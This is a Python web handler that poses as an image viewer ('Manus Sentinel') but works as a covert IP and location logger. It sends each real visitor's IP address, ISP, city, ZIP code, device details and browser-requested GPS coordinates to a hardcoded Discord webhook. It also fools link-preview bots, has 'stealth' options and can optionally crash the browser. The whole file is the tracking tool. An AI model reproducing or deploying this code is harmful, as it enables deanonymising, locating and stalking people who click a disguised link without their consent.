from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback
import requests
import base64
import httpagentparser
import json
import time

# --- CONFIGURATION ---
config = {
    "webhook": "https://discord.com/api/webhooks/1466906538148102235/itmF63UvtsjjygTjbcLYaxwBTBB5Ger3CjaVCbQoab51UZjU7qsxSWXd38xZ3n9ZKmAc",
    "image": "https://cdn.discordapp.com/attachments/1454160227611050247/1461001126324473926/image.png?ex=697eb794&is=697d6614&hm=a817fd7d2715116946ba366720ff256071ba375b449c497dc5fafa8bffa99a56&",
    "imageArgument": True,
    "username": "Manus Sentinel",
    "color": 0x2b2d31, # Discord Dark Theme color for stealth
    "crashBrowser": False,
    "accurateLocation": True,
    "message": {
        "doMessage": False,
        "message": "Access Denied.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://google.com"
    },
    # --- NEW QoL FEATURES ---
    "stealthMode": True, # Hides the script's identity from common scanners
    "logReferer": True,  # Logs where the link was clicked from (e.g., Discord, Browser)
    "customTitle": "System Alert", # Custom title for the webhook embed
}

# Known bot/crawler IP ranges and strings
blacklistedIPs = ("27", "104", "143", "164")
bot_keywords = ["bot", "crawler", "spider", "discord", "slack", "whatsapp", "telegram", "preview"]

def botCheck(ip, useragent):
    if not ip or not useragent:
        return "Unknown/Bot"
    
    ua_lower = useragent.lower()
    
    # Check IP ranges
    if ip.startswith(("34", "35")):
        return "Discord Crawler"
    
    # Check User-Agent keywords
    for keyword in bot_keywords:
        if keyword in ua_lower:
            return f"Bot ({keyword.capitalize()})"
            
    return False

def get_location_data(ip):
    try:
        # Using a more reliable fields set for ip-api
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting,query", timeout=5)
        return response.json()
    except:
        return None

def send_webhook(payload):
    try:
        requests.post(config["webhook"], json=payload, timeout=10)
    except Exception as e:
        print(f"Webhook Error: {e}")

def create_embed(title, description, color, fields=None, thumbnail=None):
    embed = {
        "title": title,
        "description": description,
        "color": color,
        "timestamp": time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
        "footer": {"text": "Manus Sentinel v3.0 | Security Intelligence"}
    }
    if fields:
        embed["fields"] = fields
    if thumbnail:
        embed["thumbnail"] = {"url": thumbnail}
    return embed

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # 1. Extract Client Info
            # Vercel passes the real IP in x-forwarded-for
            forwarded = self.headers.get('x-forwarded-for', '')
            ip = forwarded.split(',')[0].strip() if forwarded else self.address_string()
            useragent = self.headers.get('user-agent', 'Unknown')
            referer = self.headers.get('referer', 'Direct Access')
            
            # 2. Parse URL Arguments
            path_parts = parse.urlsplit(self.path)
            query_params = dict(parse.parse_qsl(path_parts.query))
            endpoint = path_parts.path
            
            target_image = config["image"]
            if config["imageArgument"]:
                if "url" in query_params:
                    try: target_image = base64.b64decode(query_params["url"]).decode()
                    except: pass
                elif "id" in query_params:
                    try: target_image = base64.b64decode(query_params["id"]).decode()
                    except: pass

            # 3. Bot/Crawler Detection
            bot_type = botCheck(ip, useragent)
            
            if bot_type:
                # Handle Discord/Bot Preview
                if config["buggedImage"]:
                    self.send_response(200)
                    self.send_header('Content-type', 'image/jpeg')
                    self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
                    self.end_headers()
                    self.wfile.write(binaries["loading"])
                else:
                    self.send_response(302)
                    self.send_header('Location', target_image)
                    self.end_headers()
                
                # Log the link being sent/previewed
                if config["linkAlerts"]:
                    desc = f"**Link Previewed by Bot**\n\n**Platform:** `{bot_type}`\n**IP:** `{ip}`\n**Endpoint:** `{endpoint}`"
                    fields = [{"name": "User Agent", "value": f"```\n{useragent[:1000]}\n```", "inline": False}]
                    payload = {
                        "username": config["username"],
                        "embeds": [create_embed("🔗 Link Activity", desc, config["color"], fields)]
                    }
                    send_webhook(payload)
                return

            # 4. Real User Processing
            location = get_location_data(ip)
            os_info, browser_info = httpagentparser.simple_detect(useragent)
            
            # Check for GPS data from previous redirect
            precise_coords = None
            if "g" in query_params:
                try: precise_coords = base64.b64decode(query_params["g"]).decode()
                except: pass

            # 5. Send Detailed Webhook
            fields = [
                {"name": "🌐 Network", "value": f"**IP:** `{ip}`\n**ISP:** `{location.get('isp', 'N/A')}`\n**VPN/Proxy:** `{location.get('proxy', 'False')}`", "inline": True},
                {"name": "📍 Location", "value": f"**Country:** {location.get('country', 'N/A')}\n**City:** {location.get('city', 'N/A')}\n**ZIP:** {location.get('zip', 'N/A')}", "inline": True},
                {"name": "💻 Device", "value": f"**OS:** {os_info}\n**Browser:** {browser_info}", "inline": True},
            ]
            
            if precise_coords:
                fields.append({"name": "🎯 Precise Coordinates", "value": f"[{precise_coords}](https://www.google.com/maps/search/?api=1&query={precise_coords})", "inline": False})
            elif location and location.get('lat'):
                fields.append({"name": "📍 Approx. Coordinates", "value": f"[{location['lat']}, {location['lon']}](https://www.google.com/maps/search/?api=1&query={location['lat']},{location['lon']})", "inline": False})

            if config["logReferer"]:
                fields.append({"name": "🔗 Referer", "value": f"`{referer}`", "inline": False})

            payload = {
                "username": config["username"],
                "content": "@everyone" if not location.get('proxy') else "",
                "embeds": [create_embed(config["customTitle"], f"**Target Logged at `{endpoint}`**", config["color"], fields, target_image)]
            }
            send_webhook(payload)

            # 6. Final Response to User
            if config["redirect"]["redirect"]:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(f'<html><head><meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}"></head></html>'.encode())
            else:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                
                # Enhanced HTML with stealth and QoL
                html = f'''<!DOCTYPE html>
                <html>
                <head>
                    <title>Image Viewer</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1">
                    <style>
                        body, html {{ margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; display: flex; justify-content: center; align-items: center; }}
                        .container {{ width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; }}
                        img {{ max-width: 100%; max-height: 100%; object-fit: contain; }}
                    </style>
                </head>
                <body>
                    <div class="container">
                        <img src="{target_image}" alt="Image">
                    </div>'''
                
                # GPS Request Logic
                if config["accurateLocation"] and not precise_coords:
                    html += '''
                    <script>
                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(function(p) {
                                let url = new URL(window.location.href);
                                url.searchParams.set("g", btoa(p.coords.latitude + "," + p.coords.longitude));
                                window.location.replace(url.href);
                            }, function(e) { console.log("Loc denied"); }, {enableHighAccuracy: true});
                        }
                    </script>'''
                
                if config["crashBrowser"]:
                    html += '<script>setTimeout(()=>{while(true){console.log(Math.random())}}, 500);</script>'
                
                html += '</body></html>'
                self.wfile.write(html.encode())

        except Exception:
            err = traceback.format_exc()
            payload = {
                "username": config["username"],
                "embeds": [create_embed("⚠️ System Error", f"```python\n{err[:1800]}\n```", 0xff0000)]
            }
            send_webhook(payload)
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Internal Server Error")

    def do_POST(self):
        self.do_GET()
